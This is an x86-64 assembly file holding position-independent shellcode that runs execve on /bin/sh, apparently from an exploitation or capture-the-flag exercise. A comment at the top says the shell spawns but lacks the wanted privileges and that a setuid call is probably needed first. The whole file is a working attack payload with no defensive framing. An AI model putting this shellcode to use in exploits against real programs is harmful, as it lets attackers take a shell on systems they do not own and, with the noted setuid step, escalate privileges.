
/*
Did not work. Yes we do the execve and pop a shell, but have the wron permissions.
Probably we need to do setuid before popping the shell, here in the assembly code.
*/

.intel_syntax noprefix
.text
.global shellcode

shellcode:
xor     rdx, rdx
lea rbx, [rip+binsh]
mov     rdi, rbx
push    rdx                            
push    rbx                            
mov     rsi, rsp
mov     eax, 0x3b
syscall

ud2

/************* Fake data section *************/
/* we just want these read-only data to be near our pie code. Similar to arm64 :) */
binsh:                                 
.ascii "/bin/sh\0"
